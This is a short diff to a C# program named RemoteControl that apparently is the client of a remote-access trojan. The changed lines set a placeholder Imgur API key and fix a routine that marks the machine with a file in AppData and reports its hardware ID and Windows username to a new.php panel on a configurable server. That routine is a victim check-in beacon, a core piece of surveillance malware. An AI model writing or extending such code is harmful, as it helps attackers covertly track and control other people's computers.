@@ -18,7 +18,7 @@ namespace RemoteControl
         static string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
         static string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
         static string link = "http://127.0.0.1";
-        static string imgur_api = "";
+        static string imgur_api = "paste_key";
 
         static string HWID()
         {
@@ -84,7 +84,7 @@ namespace RemoteControl
         {
             File.WriteAllText(AppData + "\\RemoteControl.dat", "");
             WebClient new_user = new WebClient();
-            new_user.DownloadString(link+"\new.php?id=" + HWID() + "&user=" + Environment.UserName);
+            new_user.DownloadString(link+ "/new.php?hwid=" + HWID() + "&user=" + Environment.UserName);
         }
 
         static void GsH()
